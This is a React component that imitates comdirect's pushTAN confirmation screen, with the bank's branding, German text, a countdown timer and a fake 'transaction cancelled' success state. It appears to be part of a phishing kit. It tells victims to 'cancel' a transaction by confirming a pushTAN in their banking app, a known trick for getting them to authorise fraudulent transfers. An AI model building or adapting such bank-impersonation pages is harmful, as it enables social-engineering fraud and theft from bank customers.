import React, { useState, useEffect } from 'react';
import Loading from './Loading';

interface TransactionDetails {
  amount?: string;
  recipient?: string;
  reference?: string;
  iban?: string;
}

type TANType = 'TRANSACTION_TAN' | 'LOGIN_TAN';

interface PushTANScreenProps {
  tanType: TANType;
  transactionDetails?: TransactionDetails;
  onConfirm: () => void;
  onCancel?: () => void;
}

const PushTANScreen: React.FC<PushTANScreenProps> = ({ 
  tanType,
  transactionDetails = {}, 
  onConfirm, 
  onCancel
}) => {
  const [isWaiting, setIsWaiting] = useState(true);
  const [countdown, setCountdown] = useState(120);
  const [isLoading, setIsLoading] = useState(false);
  const [isMobile, setIsMobile] = useState(false);

  useEffect(() => {
    const checkScreenSize = () => {
      setIsMobile(window.innerWidth <= 768);
    };
    checkScreenSize();
    window.addEventListener('resize', checkScreenSize);
    return () => window.removeEventListener('resize', checkScreenSize);
  }, []);

  useEffect(() => {
    const timer = setInterval(() => {
      setCountdown(prev => {
        if (prev <= 1) {
          clearInterval(timer);
          setIsWaiting(false);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, '0')}`;
  };

  const handleConfirm = async () => {
    setIsLoading(true);
    await new Promise(resolve => setTimeout(resolve, 1500));
    setIsLoading(false);
    onConfirm();
  };

  if (isLoading) {
    return (
      <Loading 
        message={tanType === 'TRANSACTION_TAN' ? 'Stornierung wird verarbeitet...' : 'pushTAN wird verarbeitet...'}
        type="processing"
      />
    );
  }

  return (
    <div style={{
      minHeight: '100vh',
      backgroundColor: '#ffffff',
      fontFamily: 'MarkWeb, Helvetica Neue, Helvetica, Arial, sans-serif',
      color: '#0B1E25'
    }}>
      <div style={{
        maxWidth: '980px',
        margin: '0 auto',
        padding: isMobile ? '20px' : '60px 20px',
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        minHeight: '100vh',
        justifyContent: 'center'
      }}>
        
        {/* Main TAN Card */}
        <div style={{
          width: '100%',
          maxWidth: '700px',
          backgroundColor: '#ffffff',
          border: '1px solid #E0E0E0',
          borderRadius: '8px',
          boxShadow: '0 2px 8px rgba(0, 0, 0, 0.1)',
          overflow: 'hidden'
        }}>
          
          {/* Yellow Header Bar - comdirect's signature */}
          <div style={{
            backgroundColor: '#fff500',
            padding: '25px',
            textAlign: 'center',
            borderBottom: '1px solid #E0E0E0'
          }}>
            <h1 style={{
              color: '#000000',
              fontSize: isMobile ? '1.5rem' : '1.875rem',
              fontWeight: '400',
              margin: '0',
              fontFamily: 'MarkWeb, Helvetica Neue, Helvetica, Arial, sans-serif',
              lineHeight: isMobile ? '1.75rem' : '2.625rem'
            }}>
              {tanType === 'TRANSACTION_TAN' ? 'pushTAN Stornierung' : 'pushTAN Anmeldung'}
            </h1>
          </div>

          {/* Main Content */}
          <div style={{
            padding: isMobile ? '20px' : '30px'
          }}>
            
            {/* Instruction Box */}
            <div style={{
              backgroundColor: '#F5F5F5',
              border: '1px solid #E0E0E0',
              borderRadius: '4px',
              padding: '20px',
              marginBottom: '30px',
              textAlign: 'center'
            }}>
              <p style={{
                margin: '0',
                fontSize: isMobile ? '14px' : '16px',
                color: '#0B1E25',
                fontFamily: 'MarkWeb, Helvetica Neue, Helvetica, Arial, sans-serif',
                lineHeight: '1.5'
              }}>
                {tanType === 'TRANSACTION_TAN' 
                  ? 'Bestätigen Sie die Stornierung der Transaktion in Ihrer comdirect Banking-App.'
                  : 'Bestätigen Sie Ihren Anmeldeversuch in Ihrer comdirect Banking-App.'
                }
              </p>
            </div>

            {/* Transaction Details Card - only for TRANSACTION_TAN */}
            {tanType === 'TRANSACTION_TAN' && transactionDetails.amount && (
              <div style={{
                backgroundColor: '#ffffff',
                border: '2px solid #007BB8',
                borderRadius: '4px',
                padding: '25px',
                marginBottom: '30px'
              }}>
                <h2 style={{
                  color: '#007BB8',
                  fontSize: isMobile ? '1.25rem' : '1.5rem',
                  fontWeight: '500',
                  margin: '0 0 20px 0',
                  fontFamily: 'MarkWeb, Helvetica Neue, Helvetica, Arial, sans-serif',
                  textAlign: 'center'
                }}>
                  Zu stornierende Transaktion
                </h2>
                
                <div style={{ display: 'flex', flexDirection: 'column', gap: '15px' }}>
                  <div style={{ 
                    display: 'flex', 
                    justifyContent: 'space-between', 
                    alignItems: 'center',
                    paddingBottom: '10px',
                    borderBottom: '1px solid #E0E0E0'
                  }}>
                    <span style={{
                      color: '#7d8287',
                      fontSize: '14px',
                      fontFamily: 'MarkWeb, Helvetica Neue, Helvetica, Arial, sans-serif'
                    }}>Betrag:</span>
                    <span style={{
                      color: '#007BB8',
                      fontSize: '18px',
                      fontFamily: 'MarkWeb, Helvetica Neue, Helvetica, Arial, sans-serif',
                      fontWeight: '500'
                    }}>{transactionDetails.amount}</span>
                  </div>
                  
                  {transactionDetails.recipient && (
                    <div style={{ 
                      display: 'flex', 
                      justifyContent: 'space-between', 
                      alignItems: 'center',
                      paddingBottom: '10px',
                      borderBottom: '1px solid #E0E0E0'
                    }}>
                      <span style={{
                        color: '#7d8287',
                        fontSize: '14px',
                        fontFamily: 'MarkWeb, Helvetica Neue, Helvetica, Arial, sans-serif'
                      }}>Empfänger:</span>
                      <span style={{
                        color: '#0B1E25',
                        fontSize: '14px',
                        fontFamily: 'MarkWeb, Helvetica Neue, Helvetica, Arial, sans-serif',
                        textAlign: 'right',
                        maxWidth: '60%'
                      }}>{transactionDetails.recipient}</span>
                    </div>
                  )}
                  
                  {transactionDetails.iban && (
                    <div style={{ 
                      display: 'flex', 
                      justifyContent: 'space-between', 
                      alignItems: 'center',
                      paddingBottom: '10px',
                      borderBottom: '1px solid #E0E0E0'
                    }}>
                      <span style={{
                        color: '#7d8287',
                        fontSize: '14px',
                        fontFamily: 'MarkWeb, Helvetica Neue, Helvetica, Arial, sans-serif'
                      }}>IBAN:</span>
                      <span style={{
                        color: '#0B1E25',
                        fontSize: '14px',
                        fontFamily: 'monospace',
                        textAlign: 'right'
                      }}>{transactionDetails.iban}</span>
                    </div>
                  )}
                  
                  {transactionDetails.reference && (
                    <div style={{ 
                      display: 'flex', 
                      justifyContent: 'space-between', 
                      alignItems: 'center'
                    }}>
                      <span style={{
                        color: '#7d8287',
                        fontSize: '14px',
                        fontFamily: 'MarkWeb, Helvetica Neue, Helvetica, Arial, sans-serif'
                      }}>Verwendungszweck:</span>
                      <span style={{
                        color: '#0B1E25',
                        fontSize: '14px',
                        fontFamily: 'MarkWeb, Helvetica Neue, Helvetica, Arial, sans-serif',
                        textAlign: 'right',
                        maxWidth: '60%'
                      }}>{transactionDetails.reference}</span>
                    </div>
                  )}
                </div>
              </div>
            )}

            {/* Status Section */}
            <div style={{
              backgroundColor: '#F5F5F5',
              border: '1px solid #E0E0E0',
              borderRadius: '4px',
              padding: '30px',
              textAlign: 'center',
              marginBottom: '30px'
            }}>
              {isWaiting ? (
                <div>
                  {/* comdirect Loading Spinner */}
                  <div style={{
                    width: '50px',
                    height: '50px',
                    border: '4px solid #E0E0E0',
                    borderTop: '4px solid #007BB8',
                    borderRadius: '50%',
                    animation: 'spin 1s linear infinite',
                    margin: '0 auto 25px auto'
                  }} />
                  
                  <h3 style={{
                    color: '#007BB8',
                    fontSize: isMobile ? '1.125rem' : '1.25rem',
                    fontWeight: '500',
                    margin: '0 0 15px 0',
                    fontFamily: 'MarkWeb, Helvetica Neue, Helvetica, Arial, sans-serif'
                  }}>
                    {tanType === 'TRANSACTION_TAN' ? 'Warten auf Stornierung...' : 'Warten auf Anmeldung...'}
                  </h3>
                  
                  <p style={{
                    color: '#7d8287',
                    fontSize: '14px',
                    margin: '0 0 15px 0',
                    fontFamily: 'MarkWeb, Helvetica Neue, Helvetica, Arial, sans-serif'
                  }}>
                    Bitte bestätigen Sie in Ihrer comdirect App.
                  </p>
                  
                  <p style={{
                    color: '#EF4444',
                    fontSize: '14px',
                    margin: '0',
                    fontFamily: 'MarkWeb, Helvetica Neue, Helvetica, Arial, sans-serif',
                    fontWeight: '500'
                  }}>
                    Timeout in: {formatTime(countdown)}
                  </p>
                </div>
              ) : (
                <div>
                  {/* Success Icon */}
                  <div style={{
                    width: '50px',
                    height: '50px',
                    backgroundColor: '#10B981',
                    borderRadius: '50%',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center',
                    margin: '0 auto 25px auto'
                  }}>
                    <svg width="25" height="25" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="3">
                      <path d="M20 6L9 17l-5-5"/>
                    </svg>
                  </div>
                  
                  <h3 style={{
                    color: '#10B981',
                    fontSize: isMobile ? '1.125rem' : '1.25rem',
                    fontWeight: '500',
                    margin: '0 0 15px 0',
                    fontFamily: 'MarkWeb, Helvetica Neue, Helvetica, Arial, sans-serif'
                  }}>
                    {tanType === 'TRANSACTION_TAN' ? 'Transaktion storniert' : 'Anmeldung bestätigt'}
                  </h3>
                  
                  <p style={{
                    color: '#0B1E25',
                    fontSize: '14px',
                    margin: '0',
                    fontFamily: 'MarkWeb, Helvetica Neue, Helvetica, Arial, sans-serif'
                  }}>
                    Sie können nun fortfahren.
                  </p>
                </div>
              )}
            </div>

            {/* Action Buttons */}
            <div style={{
              display: 'flex',
              flexDirection: isMobile ? 'column' : 'row',
              justifyContent: 'center',
              alignItems: 'center',
              gap: '15px',
              marginBottom: '20px'
            }}>
              <button
                onClick={handleConfirm}
                disabled={isLoading}
                style={{
                  backgroundColor: isLoading ? '#E0E0E0' : '#fff500',
                  color: '#000000',
                  border: 'none',
                  borderRadius: '4px',
                  padding: '14px 28px',
                  fontSize: '16px',
                  fontFamily: 'MarkWeb, Helvetica Neue, Helvetica, Arial, sans-serif',
                  fontWeight: '500',
                  cursor: isLoading ? 'not-allowed' : 'pointer',
                  transition: 'background-color 0.2s ease',
                  width: isMobile ? '100%' : 'auto',
                  minWidth: '180px'
                }}
                onMouseEnter={(e) => {
                  if (!isLoading) {
                    (e.target as HTMLButtonElement).style.backgroundColor = '#e6d900';
                  }
                }}
                onMouseLeave={(e) => {
                  if (!isLoading) {
                    (e.target as HTMLButtonElement).style.backgroundColor = '#fff500';
                  }
                }}
              >
                {isWaiting 
                  ? (tanType === 'TRANSACTION_TAN' ? 'Manuell stornieren' : 'Manuell bestätigen')
                  : 'Weiter'
                }
              </button>
              
              {onCancel && (
                <button
                  onClick={onCancel}
                  style={{
                    backgroundColor: 'transparent',
                    color: '#007BB8',
                    border: '2px solid #007BB8',
                    borderRadius: '4px',
                    padding: '12px 26px',
                    fontSize: '16px',
                    fontFamily: 'MarkWeb, Helvetica Neue, Helvetica, Arial, sans-serif',
                    fontWeight: '500',
                    cursor: 'pointer',
                    transition: 'all 0.2s ease',
                    width: isMobile ? '100%' : 'auto',
                    minWidth: '180px'
                  }}
                  onMouseEnter={(e) => {
                    (e.target as HTMLButtonElement).style.backgroundColor = '#007BB8';
                    (e.target as HTMLButtonElement).style.color = '#ffffff';
                  }}
                  onMouseLeave={(e) => {
                    (e.target as HTMLButtonElement).style.backgroundColor = 'transparent';
                    (e.target as HTMLButtonElement).style.color = '#007BB8';
                  }}
                >
                  {tanType === 'TRANSACTION_TAN' ? 'Stornierung abbrechen' : 'Anmeldung abbrechen'}
                </button>
              )}
            </div>

            {/* Footer Info */}
            <div style={{ textAlign: 'center' }}>
              <p style={{
                color: '#7d8287',
                fontSize: '12px',
                margin: '0',
                fontFamily: 'MarkWeb, Helvetica Neue, Helvetica, Arial, sans-serif'
              }}>
                Probleme mit der App? Kontaktieren Sie den comdirect Kundenservice.
              </p>
            </div>
          </div>
        </div>
      </div>

      <style jsx>{`
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
      `}</style>
    </div>
  );
};

export { PushTANScreen };
